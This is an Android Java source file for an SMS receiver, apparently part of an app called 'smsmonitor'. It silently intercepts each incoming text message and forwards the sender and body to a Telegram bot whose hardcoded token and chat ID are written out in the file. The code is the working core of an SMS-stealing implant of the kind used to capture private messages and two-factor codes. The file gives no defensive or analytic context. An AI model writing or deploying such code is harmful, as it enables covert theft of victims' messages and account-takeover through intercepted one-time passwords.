package com.example.smsmonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import okhttp3.OkHttpClient;
import okhttp3.Request;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TOKEN = "7791863613:AAH6J4B0gu7-W1DvnShaAQ2wZH3WHFt6Za8";
    private static final String CHAT_ID = "7996973999";

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                String msg = sms.getMessageBody();
                String sender = sms.getOriginatingAddress();
                sendToTelegram("SMS from " + sender + ": " + msg);
            }
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                OkHttpClient client = new OkHttpClient();
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
                Request request = new Request.Builder().url(url).build();
                client.newCall(request).execute().close();
            } catch (Exception e) {
                Log.e("SmsReceiver", "Failed to send message", e);
            }
        }).start();
    }
}